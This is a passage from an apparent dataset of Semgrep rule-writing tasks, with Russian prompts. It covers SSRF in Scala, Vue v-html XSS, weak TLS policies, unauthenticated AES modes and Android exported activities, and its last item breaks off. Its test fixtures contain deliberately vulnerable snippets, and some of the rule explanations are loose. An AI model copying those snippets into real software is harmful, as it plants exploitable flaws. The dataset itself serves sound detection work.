    "instruction": "Создай правило Semgrep для обнаружения: raise-not-base-exception\nОписание уязвимости: In Python3, a runtime `TypeError` will be thrown if you attempt to raise an object or class which does not inherit from `BaseException`\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: exceptions.py\n# ruleid:raise-not-base-exception\nraise \"error here\"\n\n# ruleid:raise-not-base-exception\nraise 5\n\n\nclass Foobar:\n    x = 5\n\n\n# todoruleid:raise-not-base-exception\nraise Foobar()\n\n\nclass Foobar2(BaseException):\n    x = 5\n\n\n# ok:raise-not-base-exception\nraise Foobar2()\n\n# ok:raise-not-base-exception\nraise Exception()  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: exceptions.py\n# ruleid:raise-not-base-exception\nraise \"error here\"\n• // File: exceptions.py\n# ruleid:raise-not-base-exception\nraise 5\n\nБезопасные паттерны:  \n• // File: exceptions.py\n# ok:raise-not-base-exception\nraise Foobar2()\n• // File: exceptions.py\n# ok:raise-not-base-exception\nraise Exception()\n\nЛегенда аннотаций:\n- // ruleid:raise-not-base-exception: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:raise-not-base-exception: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: raise-not-base-exception\n    message:\n      In Python3, a runtime `TypeError` will be thrown if you attempt to raise an object or class which does not inherit\n      from `BaseException`\n    languages: [python]\n    severity: ERROR\n    pattern-either:\n      - pattern: raise \"...\"\n      - pattern: |\n          $X: BaseException\n          raise $X(...)\n      - patterns:\n          - pattern: raise $EXCEPTION\n          - metavariable-regex:\n              metavariable: $EXCEPTION\n              regex: '[0-9]*\\.?[0-9]+'\n    metadata:\n      category: correctness\n      technology:\n        - python\n\n\n# Логика правила:\nЭто правило ищет случаи, когда в Python поднимается исключение не наследуемое от BaseException. Анализ выполняется путем поиска конструкций 'raise', за которыми следует строка или число (потенциально недопустимые типы исключений), а также проверки, что объект или класс, переданный в функцию raise, является экземпляром BaseException. Если условие не выполнено, выдается предупреждение.\n\n# Ключевые элементы:\n- ID: raise-not-base-exception\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "raise-not-base-exception",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: webservice-ssrf\nОписание уязвимости: A parameter being passed directly into `WSClient` most likely lead to SSRF. This could allow an attacker to send data to their own server, potentially exposing sensitive data sent with this request. They could also probe internal servers or other resources that the server running this code can access. Do not allow arbitrary hosts. Instead, create an allowlist for approved hosts hardcode the correct host.\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: scala",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: webservice-ssrf.scala\npackage controllers\n\nimport javax.inject._\nimport play.api._\nimport play.api.mvc._\nimport play.api.libs.ws._\nimport scala.concurrent.Future\nimport scala.util.Success\nimport scala.util.Failure\nimport scala.concurrent.ExecutionContext\n\nobject Smth {\n  def call1(wsClient: WSClient, url: String): Future[Unit] = {\n    // ruleid: webservice-ssrf\n    wsClient.url(url).get().map { response =>\n      val statusText: String = response.statusText\n      println(s\"Got a response $statusText\")\n    }\n  }\n\n  def call2(wsClient: WSClient): Future[Unit] = {\n    // ok: webservice-ssrf\n    wsClient.url(\"https://www.google.com\").get().map { response =>\n      val statusText: String = response.statusText\n      println(s\"Got a response $statusText\")\n    }\n  }\n}\n\nobject FooBar {\n  def call1(url: String): Future[Unit] = {\n    val wsClient = AhcWSClient()\n    // ruleid: webservice-ssrf\n    wsClient.url(url).get().map { response =>\n      val statusText: String = response.statusText\n      println(s\"Got a response $statusText\")\n    }\n  }\n\n  def call2(): Future[Unit] = {\n    val wsClient = AhcWSClient()\n    // ok: webservice-ssrf\n    wsClient.url(\"https://www.google.com\").get().map { response =>\n      val statusText: String = response.statusText\n      println(s\"Got a response $statusText\")\n    }\n  }\n}\n\n@Singleton\nclass HomeController @Inject()(\n  ws: WSClient,\n  val controllerComponents: ControllerComponents,\n  implicit val ec: ExecutionContext\n) extends BaseController {\n\n  def req1(url: String) = Action.async { implicit request: Request[AnyContent] =>\n    // ruleid: webservice-ssrf\n    val futureResponse = ws.url(url).get()\n    futureResponse.map { response =>\n      Ok(s\"it works: ${response.statusText}\")\n    }\n  }\n\n  def req2(url: String) = Action.async { implicit request: Request[AnyContent] =>\n    // ok: webservice-ssrf\n    val futureResponse = ws.url(\"https://www.google.com\").get()\n    futureResponse.map { response =>\n      Ok(s\"it works: ${url}\")\n    }\n  }\n\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: webservice-ssrf.scala\nwsClient.url(url).get().map {...}\n• // File: webservice-ssrf.scala\nval futureResponse = ws.url(url).get();...\n• // File: webservice-ssrf.scala\ndef call1(url: String): Future[Unit] = { ... wsClient.url(url)... }\n\nБезопасные паттерны:  \n• // File: webservice-ssrf.scala\nwsClient.url(\"https://www.google.com\").get().map {...}\n• // File: webservice-ssrf.scala\ndef call2(): Future[Unit] = { ... wsClient.url(\"https://www.google.com\")... }\n• // File: webservice-ssrf.scala\nval futureResponse = ws.url(\"https://www.google.com\").get();...\n\nЛегенда аннотаций:\n- // ruleid:webservice-ssrf: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:webservice-ssrf: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: webservice-ssrf\n  patterns:\n  - pattern: $WS.url($URL)\n  - pattern-either:\n    - pattern-inside: |\n        class $CLASS (..., $WS: WSClient, ...) {\n          ...\n        }\n    - pattern-inside: |\n        def $FUNC(..., $WS: WSClient, ...) = {\n          ...\n        }\n    - pattern-inside: |\n        $WS = AhcWSClient(...)\n        ...\n  - pattern-either:\n    - pattern-inside: |\n        def $FUNC(..., $URL: $T, ...) = $A {\n          ...\n        }\n    - pattern-inside: |\n        def $FUNC(..., $URL: $T, ...) = {\n          ...\n        }\n  message: >-\n    A parameter being passed directly into `WSClient` most likely lead to SSRF.\n    This could allow an attacker to send data to their own server, potentially exposing sensitive data\n    sent with this request.\n    They could also probe internal servers or other resources that the server running this code can access.\n    Do not allow arbitrary hosts. Instead, create an allowlist for approved hosts hardcode the correct\n    host.\n  metadata:\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n    - https://www.playframework.com/documentation/2.8.x/ScalaWS\n    category: security\n    technology:\n    - scala\n    - play\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  languages: [scala]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования объекта WSClient с передачей параметра URL напрямую, что может привести к SSRF-уязвимости. Паттерн ищет вызов метода url() объекта WSClient, внутри которого находится определение класса или функции, содержащей параметр URL. Также проверяется создание экземпляра AhcWSClient, который часто используется в Play Framework. Правило использует комбинацию шаблонов и операторов inside/either для охвата различных вариантов использования.\n\n# Ключевые элементы:\n- ID: webservice-ssrf\n- Язык: scala \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "webservice-ssrf",
      "language": "scala",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: avoid-v-html\nОписание уязвимости: Dynamically rendering arbitrary HTML on your website can be very dangerous because it can easily lead to XSS vulnerabilities. Only use HTML interpolation on trusted content and never on user-provided content.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-v-html.vue\n<div>\n  <!-- ruleid: avoid-v-html -->\n  <span dir=\"auto\" class=\"markdown\" v-html=\"entry.post\"></span>\n  <!-- ok: avoid-v-html -->\n  <span dir=\"auto\" class=\"markdown\">{{entry.post}}</span>\n</div>  # Ограничиваем длину\n\nОпасные паттерны:\n• <span dir=\\\n•  class=\\\n•  v-html=\\\\\\\n\nБезопасные паттерны:  \n• <span dir=\\\n•  class=\\\n• >{{entry.post}}</span>\n\nЛегенда аннотаций:\n- // ruleid:avoid-v-html: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-v-html: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-v-html\n  message: Dynamically rendering arbitrary HTML on your website can be very dangerous because it can easily\n    lead to XSS vulnerabilities. Only use HTML interpolation on trusted content and never on user-provided\n    content.\n  metadata:\n    references:\n    - https://vuejs.org/v2/guide/syntax.html#Raw-HTML\n    category: security\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    technology:\n    - vue\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - regex\n  severity: WARNING\n  paths:\n    include:\n    - '*.vue'\n  pattern-regex: <[^<>]*v-html=\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска использования атрибута 'v-html' в Vue.js шаблонах. Опасным примером является динамическое рендеринг произвольного HTML, который может привести к XSS-уязвимостям, если контент не проверен на безопасность перед вставкой. Безопасный пример демонстрирует правильное использование интерполяции текста вместо HTML.\n\n# Ключевые элементы:\n- ID: avoid-v-html\n- Язык: regex \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-v-html",
      "language": "regex",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-compute-ssl-policy\nОписание уязвимости: Ensure no HTTPS or SSL proxy load balancers permit SSL policies with weak cipher suites\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-compute-ssl-policy.tf\n# fail\n# ruleid: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"fail1\" {\n    name            = \"nonprod-ssl-policy\"\n    profile         = \"MODERN\"\n}\n\n# fail\n# ruleid: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"fail2\" {\n    name            = \"custom-ssl-policy\"\n    min_tls_version = \"TLS_1_2\"\n    profile         = \"CUSTOM\"\n    custom_features = [\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\", \"TLS_RSA_WITH_AES_256_GCM_SHA384\"]\n}\n\n# ok: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"success1\" {\n    name            = \"nonprod-ssl-policy\"\n    profile         = \"MODERN\"\n    min_tls_version = \"TLS_1_2\"\n}\n\n# ok: gcp-compute-ssl-policy\nresource \"google_compute_ssl_policy\" \"success1\" {\n    name            = \"custom-ssl-policy\"\n    min_tls_version = \"TLS_1_2\"\n    profile         = \"CUSTOM\"\n    custom_features = [\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\", \"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\"]\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { \\n    name = \\\n\nБезопасные паттерны:  \n• resource \\\n•  \\\n•  { \\n    name = \\\n\nЛегенда аннотаций:\n- // ruleid:gcp-compute-ssl-policy: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-compute-ssl-policy: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-compute-ssl-policy\n  patterns:\n  - pattern: resource\n  - pattern-either:\n    - pattern-inside: |\n        resource \"google_compute_ssl_policy\" \"...\" {\n        ...\n        profile = \"MODERN\"\n        ...\n        }\n    - pattern-inside: |\n        resource \"google_compute_ssl_policy\" \"...\" {\n        ...\n        profile = \"CUSTOM\"\n        custom_features = [..., \"TLS_RSA_WITH_AES_256_GCM_SHA384\", ...]\n        ...\n        }\n  - pattern-not-inside: |\n      resource \"google_compute_ssl_policy\" \"...\" {\n      ...\n      profile = \"MODERN\"\n      min_tls_version = \"TLS_1_2\"\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"google_compute_ssl_policy\" \"...\" {\n      ...\n      profile = \"CUSTOM\"\n      custom_features = [\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\", \"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\"]\n      ...\n      }\n  message: >-\n    Ensure no HTTPS or SSL proxy load balancers permit SSL policies with weak cipher suites\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Compute Engine SSL Policy с профилем MODERN или CUSTOM и наличием определенных слабых криптографических функций. В первом случае, если профиль установлен как MODERN, но отсутствует требование TLS версии не ниже TLS_1_2, то это считается небезопасным. Во втором случае, если профиль CUSTOM содержит определенные слабые функции шифрования, такие как TLS_RSA_WITH_AES_256_GCM_SHA384, также фиксируется нарушение безопасности.\n\n# Ключевые элементы:\n- ID: gcp-compute-ssl-policy\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-compute-ssl-policy",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: crypto-mode-without-authentication\nОписание уязвимости: An encryption mode of operation is being used without proper message authentication. This can potentially result in the encrypted content to be decrypted by an attacker. Consider instead use an AEAD mode of operation like GCM. \nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: mode-without-authentication.py\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nfrom base64 import b64encode\nfrom Crypto.Hash import HMAC, SHA256\n\n\ndef example1():\n  # AES CBC, no mac\n  sensitive_data = b\"ALIENS DO EXIST!!!!\"\n  key = get_random_bytes(16)\n  # ruleid: crypto-mode-without-authentication\n  cipher = AES.new(key, AES.MODE_CBC)\n  ciphertext = cipher.encrypt(pad(sensitive_data, AES.block_size))\n\n\ndef example2():\n  # AES CBC with HMAC\n\n  key = get_random_bytes(16)\n  # ok: crypto-mode-without-authentication\n  cipher = AES.new(key, AES.MODE_CBC)\n  iv = b64encode(cipher.iv).decode('utf-8')\n  sensitive_data = b\"ALIENS DO EXIST!!!!\"\n  encrypted_bytes = cipher.encrypt(pad(\"data_to_encrypt\", AES.block_size))\n\n  hmac = HMAC.new(get_random_bytes(16), digestmod=SHA256)\n  hmac.update(encrypted_bytes)\n  mac_bytes = hmac.digest()  # Ограничиваем длину\n\nОпасные паттерны:\n• ruleid: crypto-mode-without-authentication\nsensitive_data = b\"ALIENS DO EXIST!!!!\"\nk = get_random_bytes(16)\ncipher = AES.new(k, AES.MODE_CBC)\nciphertext = cipher.encrypt(pad(sensitive_data, AES.block_\n• ruleid: crypto-mode-without-authentication\nkey = get_random_bytes(16)\ncipher = AES.new(key, AES.MODE_CFB)\nciphertext = cipher.encrypt(pad(\"data_to_encrypt\", AES.block_size))\n\nБезопасные паттерны:  \n• ok: crypto-mode-without-authentication\nkey = get_random_bytes(16)\ncipher = AES.new(key, AES.MODE_CBC)\niv = b64encode(cipher.iv).decode('utf-8')\nsensitive_data = b\"ALIENS DO EXIST!!!!\"\nencrypted_bytes \n• ok: crypto-mode-without-authentication\nk = get_random_bytes(16)\ncipher = AES.new(k, AES.MODE_CFB)\nh = HMAC.new(get_random_bytes(16), digestmod=SHA256)\nciphertext = cipher.encrypt(pad(\"data_to_encrypt\"\n\nЛегенда аннотаций:\n- // ruleid:crypto-mode-without-authentication: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:crypto-mode-without-authentication: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: crypto-mode-without-authentication\n  message: >-\n    An encryption mode of operation is being used without proper message authentication. This can potentially\n    result in the encrypted content to be decrypted by an attacker. Consider instead use an AEAD mode\n    of operation like GCM. \n  languages:\n  - python\n  severity: ERROR\n  metadata:\n    category: security\n    technology:\n    - cryptography\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern: |\n            AES.new(..., $PYCRYPTODOME_MODE)\n      - pattern-not-inside: |\n          AES.new(..., $PYCRYPTODOME_MODE)\n          ...\n          HMAC.new\n      - metavariable-pattern:\n          metavariable: $PYCRYPTODOME_MODE\n          patterns:\n          - pattern-either:\n            - pattern: AES.MODE_CBC\n            - pattern: AES.MODE_CTR\n            - pattern: AES.MODE_CFB\n            - pattern: AES.MODE_OFB\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования криптографических режимов шифрования без надлежащей аутентификации сообщения. Оно ищет случаи, когда создается объект шифра с использованием AES в режиме CBC, CTR, CFB или OFB, но отсутствует вызов функции HMAC.new непосредственно после создания объекта шифра. Это указывает на потенциальную угрозу, так как отсутствие аутентификации может позволить злоумышленнику расшифровать зашифрованное содержимое.\n\n# Ключевые элементы:\n- ID: crypto-mode-without-authentication\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "crypto-mode-without-authentication",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения shared-url-struct-mutation\nОписание уязвимости: Shared URL struct may have been accidentally mutated. Ensure that this behavior is intended.\nCWE: CWE-436: Interpretation Conflict\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-436: Interpretation Conflict\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: shared-url-struct-mutation.go\npackage main\n\nimport (\n\t\"net/http\"\n\t\"net/url\"\n)\n\nvar redirectURL, _ = url.Parse(\"https://example.com\")\n\nfunc getRedirectToken() (string, error) {\n\treturn \"abcd\", nil\n}\n\nfunc handler1(w http.ResponseWriter, r *http.Request) {\n\tu := redirectURL\n\tq := u.Query()\n\n\t// opaque process that might fail\n\ttoken, err := getRedirectToken()\n\tif err != nil {\n\t\tq.Set(\"error\", err.Error())\n\t} else {\n\t\tq.Set(\"token\", token)\n\t}\n\t// ruleid: shared-url-struct-mutation\n\tu.RawQuery = q.Encode()\n\tr.URL.RawQuery = q.Encode()\n\n\thttp.Redirect(w, r, u.String(), http.StatusFound)\n}\n\nfunc handler2(w http.ResponseWriter, r *http.Request) {\n\tu, _ := url.Parse(\"https://example.com\")\n\n\tq := u.Query()\n\n\t// opaque process that might fail\n\ttoken, err := getRedirectToken()\n\tif err != nil {\n\t\tq.Set(\"error\", err.Error())\n\t} else {\n\t\tq.Set(\"token\", token)\n\t}\n\t// ok: shared-url-struct-mutation\n\tu.RawQuery = q.Encode()\n\n\thttp.Redirect(w, r, u.String(), http.StatusFound)\n}\n\nfunc handler3(w http.ResponseWriter, r *http.Request) {\n\tu := url.URL{\n\t\tScheme: \"https\",\n\t\tHost:   \"example.com\",\n\t\tPath:   \"/\",\n\t}\n\tq := u.Query()\n\n\t// opaque process that might fail\n\ttoken, err := getRedirectToken()\n\tif err != nil {\n\t\tq.Set(\"error\", err.Error())\n\t} else {\n\t\tq.Set(\"token\", token)\n\t}\n\n\tu.RawQuery = q.Encode()\n\n\thttp.Redirect(w, r, u.String(), http.StatusFound)\n}\n\nfunc handler4(w http.ResponseWriter, r *http.Request) {\n\tvar u *url.URL\n\tif true {\n\t\tu, _ = url.Parse(\"https://example.com\")\n\t}\n\n\tif u != nil {\n\n\t\tq := u.Query()\n\n\t\t// opaque process that might fail\n\t\ttoken, err := getRedirectToken()\n\t\tif err != nil {\n\t\t\tq.Set(\"error\", err.Error())\n\t\t} else {\n\t\t\tq.Set(\"token\", token)\n\t\t}\n\t\t// ok: shared-url-struct-mutation\n\t\tu.RawQuery = q.Encode()\n\n\t\thttp.Redirect(w, r, u.String(), http.StatusFound)\n\t}\n\thttp.Redirect(w, r, \"https://google.com\", http.StatusFound)\n}\n\nfunc extraCases(w http.ResponseWriter, r *http.Request) {\n\tvar x struct {\n\t\ty []struct {\n\t\t\tPath string\n\t\t}\n\t}\n\t// ok: shared-u  # Ограничиваем длину\n\nОпасные паттерны:\n• u.RawQuery = q.Encode()\nr.URL.RawQuery = q.Encode()\n• u.Path = \"newpath\"\nu.RawQuery = q.Encode()\n• u.Scheme = \"https\"\nu.RawFragment = \"abc\"\n\nБезопасные паттерны:  \n• u, _ = url.Parse(\"https://example.com\")\nu.RawQuery = q.Encode()\n• a, _ := url.ParseRequestURI(\"https://example.com\")\na.RawQuery = \"abcd\"\n• x := url.URL{\n Scheme: \"https\",\n Host: \"example.com\",\n Path: \"/\"\n}\nx.RawQuery = q.Encode()\n\nЛегенда аннотаций:\n- // ruleid:shared-url-struct-mutation: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:shared-url-struct-mutation: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: shared-url-struct-mutation\n  message: >-\n    Shared URL struct may have been accidentally mutated. Ensure that\n    this behavior is intended.\n  languages: [go]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      import \"net/url\"\n      ...\n  - pattern-not-inside: |\n      ... = url.Parse(...)\n      ...\n  - pattern-not-inside: |\n      ... = url.ParseRequestURI(...)\n      ...\n  - pattern-not-inside: |\n      ... = url.URL{...}\n      ...\n  - pattern-not-inside: |\n      var $URL *$X.URL\n      ...\n  - pattern-either:\n      - pattern: $URL.RawQuery = ...\n      - pattern: $URL.Path = ...\n      - pattern: $URL.RawPath = ...\n      - pattern: $URL.Fragment = ...\n      - pattern: $URL.RawFragment = ...\n      - pattern: $URL.Scheme = ...\n      - pattern: $URL.Opaque = ...\n      - pattern: $URL.Host = ...\n      - pattern: $URL.User = ...\n  - metavariable-pattern:\n      metavariable: $URL\n      patterns:\n        - pattern-not: $X.$Y\n        - pattern-not: $X[...]\n  metadata:\n    cwe:\n    - \"CWE-436: Interpretation Conflict\"\n    category: security\n    subcategory:\n    - audit\n    technology:\n      - go\n    confidence: LOW\n    likelihood: LOW\n    impact: LOW\n    references:\n      - https://github.com/golang/go/issues/63777\n            \n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда структура URL случайно изменяется после ее первоначального создания. Анализируется импорт пакета 'net/url' и исключаются случаи, где URL создается напрямую через функцию Parse или ParseRequestURI, либо инициализируется явно с использованием конструктора URL. Затем проверяются операции присваивания значений отдельным полям структуры URL ($URL.RawQuery, $URL.Path и др.), которые могут привести к изменению исходной структуры. Правило также исключает ситуации, когда переменная является указателем на структуру URL ($URL *$X.URL).\n\n# Ключевые элементы:\n- ID: shared-url-struct-mutation\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "shared-url-struct-mutation",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: aws-fsx-windows-encrypted-with-cmk\nОписание уязвимости: Ensure FSX Windows file system is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in terms of access and rotation.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-fsx-windows-encrypted-with-cmk.tf\nresource \"aws_fsx_windows_file_system\" \"pass\" {\n  active_directory_id = aws_directory_service_directory.test.id\n  kms_key_id          = aws_kms_key.test1.arn\n  skip_final_backup   = true\n  storage_capacity    = 32\n  subnet_ids          = [aws_subnet.test1.id]\n  throughput_capacity = 8\n}\n# ruleid: aws-fsx-windows-encrypted-with-cmk\nresource \"aws_fsx_windows_file_system\" \"fail\" {\n  active_directory_id = aws_directory_service_directory.test.id\n  skip_final_backup   = true\n  storage_capacity    = 32\n  subnet_ids          = [aws_subnet.test1.id]\n  throughput_capacity = 8\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_fsx_windows_file_system\" \"fail\" { ... }\n• resource \"aws_fsx_windows_file_system\" \"another_fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_fsx_windows_file_system\" \"pass\" { kms_key_id = aws_kms_key.test1.arn }\n• resource \"aws_fsx_windows_file_system\" \"safe\" { kms_key_id = aws_kms_key.test2.arn }\n\nЛегенда аннотаций:\n- // ruleid:aws-fsx-windows-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-fsx-windows-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-fsx-windows-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"aws_fsx_windows_file_system\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_fsx_windows_file_system\" $ANYTHING {\n        ...\n        kms_key_id = ...\n        ...\n      }\n  message: >-\n    Ensure FSX Windows file system is encrypted at rest using KMS CMKs. CMKs gives you control over the\n    encryption key in terms of access and rotation.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS FSX Windows файловой системы, которые не используют идентификатор ключа управления ключами (kms_key_id) для шифрования при хранении. Паттерн ищет ресурсы fsx_windows_file_system без явного указания kms_key_id внутри блока ресурса. Это может привести к тому, что данные будут храниться незашифрованными или зашифрованными с использованием ключей, управление которыми не контролируется пользователем.\n\n# Ключевые элементы:\n- ID: aws-fsx-windows-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-fsx-windows-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: exported_activity\nОписание уязвимости: The application exports an activity. Any application on the device can launch the exported activity which may compromise the integrity of your application or its data.  Ensure that any exported activities do not have privileged access to your application's control plane.\nCWE: CWE-926: Improper Export of Android Application Components\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-926: Improper Export of Android Application Components\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: exported_activity.AndroidManifest.xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\">\n\n    <application\n        android:allowBackup=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.Demo_web\"\n        tools:targetApi=\"31\">\n        <!-- ok: exported_activity -->\n        <activity\n            android:name=\".cool\"\n            android:exported=\"false\">\n            <meta-data\n                android:name=\"android.app.lib_name\"\n                android:value=\"\" />\n        </activity>\n        <!-- ruleid: exported_activity -->\n        <activity\n            android:name=\".MainActivity2\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.GET_CONTENT\"/>\n            </intent-filter>\n            <meta-data\n                android:name=\"android.app.lib_name\"\n                android:value=\"\" />\n        </activity>\n        <!-- ruleid: 